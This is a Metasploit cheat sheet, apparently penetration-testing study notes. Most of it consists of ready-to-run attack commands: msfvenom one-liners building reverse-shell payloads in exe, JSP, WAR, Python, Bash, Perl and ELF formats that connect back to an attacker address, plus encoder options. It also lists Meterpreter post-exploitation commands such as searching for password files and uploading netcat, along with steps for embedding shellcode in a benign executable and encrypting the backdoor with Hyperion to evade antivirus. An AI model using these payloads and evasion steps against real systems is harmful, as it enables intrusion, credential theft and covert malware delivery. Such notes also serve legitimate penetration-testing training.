# **Metasploit Framework**
## **1. Basics**
```
1. msfconsole - Interactive console interface which is most commonly used to run regular tasks
2. msfcli - A deprecated command line interface to MSF which is useful in certain situation
3. armitage - A third party add-on to the MSF providing a graphical user interface to MSF
4. msfvenom - Used to create Payloads
```

## **2. Msfvenom**
```
1. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<Attacker IP Address> LPORT=<Attacker Port> -f exe -o A.exe
2. JSP - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker IP Address> LPORT=<Attacker Port> -f raw > shell.jsp
3. WAR - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker IP Address> LPORT=<Attacker Port> -f war > shell.war
4. Python - msfvenom -p cmd/unix/reverse_python LHOST=<Attacker IP Address> LPORT=<Attacker Port> -f raw > shell.py
5. Bash - msfvenom -p cmd/unix/reverse_bash LHOST=<Attacker IP Address> LPORT=<Attacker Port> -f raw > shell.sh
6. Perl - msfvenom -p cmd/unix/reverse_perl LHOST=<Attacker IP Address> LPORT=<Attacker Port> -f raw > shell.pl
7. Follow - https://netsec.ws/?p=331
8. msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<Attacker IP Address> LPORT=<Attacker Port> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
9. msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=<Attacker IP Address> LPORT=<Attacker Port> -b "\x00" -f elf -o /tmp/payload
10. Follow - http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/		**#Best**
11. Follow - https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/
```

## **3. Setting up Metasploit Framework**
```
1. /etc/init.d/postgresql start
2. /etc/init.d/metasploit start
To have these service start at boot time enable them using update-rc.d script.
1. update-rc.d postgresql enable
2. update-rc.d metasploit enable
```
## **4. Exploring Metasploit**
```
1. msfconsole
2. show auxiliary	-	used for info gathering, scanning and enumuration of various services
3. use <any auxuliary module>
4. info	- to get more info on a specific module
5. show options
6. setg RHOST <ip>- change behavior by using global session value, using setg command.
7. search type:auxiliary login
8. hosts - host up
9. db_nmap <ip> - to scan host with nmap
```

## **5. Auxiliary/Exploit Module**
```
1. auxiliary/scanner/snmp/snmp_enum
2. auxiliary/scanner/smb/smb_version
3. auxiliary/scanner/http/webdav_scanner
4. auxiliary/scanner/ftp/ftp_login
5. exploit/windows/pop3/seattlelab_pass
6. exploit/multihandler
7. exploit/windows/local/service_permissions
```
## **6. Staged vs Non-Staged Payload**
```
1. windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell - Nonstaged - Sent in one go
2. windows/shell/reverse_tcp - Connect back to attacker, spawn cmd shell (staged) - Send in two parts
3. Situations where we would prefer to use staged over non-staged:
	a. The vulnerability we are exploiting does not have enough buffer space to hold a full payload. As the first part of staged payload is typically smaller than a full payload, these smaller payloads can often save us in tight situations.
	b. Antivirus software is detecting embedded shellcode in an exploit. By replacing the embedded shellcode with a staged payload, we will be removing most of the malicious part of the shellcode and injecting it directly into the victim machine memory.
```

## **7. Post Exploitation Meterpreter Commands**
```
1. sysinfo
2. getuid
3. search -f *pass*.txt
4. upload	/usr/share/windows-­‐binaries/nc.exe c:\\Users\\Offsec
5. download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
6. shell
7. exit
8. ftp 127.0.0.1
9. help
10. background	#session runs in background
```
## **9. Msfpayload(Old)**
```
1. msfpayload windows/shell_reverse_tcp lhost=<ip> lport=<port> X >shell_reverse.exe
2. msfpayload windows/shell_reverse_tcp lhost=<ip> lport=<port> R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -o shell_reverse_msf_encoded.exe
3. Embedd our shellcode in non-malicious PE executable:
	a. msfpayload windows/shell_reverse_tcp lhost=<ip> lport=<port> R | msfencode -e x86/shikata_ga_nai -t exe -c 9 /usr/share/windoes-binaries/plink.exe -o shell_reverse_msf_encoded.exe
	b. Use Hyperion to encrypt our payload:
		1. cp shell_reverse_msf_encoded_embedded.exe backdoor.exe
		2. cp /usr/share/windows-­‐binaries/Hyperion-­‐1.0.zip .
		3. unzip Hyperion-­‐1.0.zip
		4. cd Hyperion-­‐1.0/
		5. i586-­‐mingw32msvc-­‐g++ Src/Crypter/*.cpp -­‐o hyperion.exe
		6. wine hyperion.exe ../backdoor.exe ../crypted.exe
4. msfpayload windows/meterpreter/reverse_https lhost=<IP< LPORT=<Port> X	> met_https_reverse.exe
```

## **10. Building your own msf module**
```
1. mkdir -­‐p ~/.msf4/modules/exploits/linux/misc
2. cd ~/.msf4/modules/exploits/linux/misc
3. cp /usr/share/metasploit-­framework/modules/exploits/linux/misc/gld_postfix.rb ./crossfire.rb
4. nano crossfire.rb
```
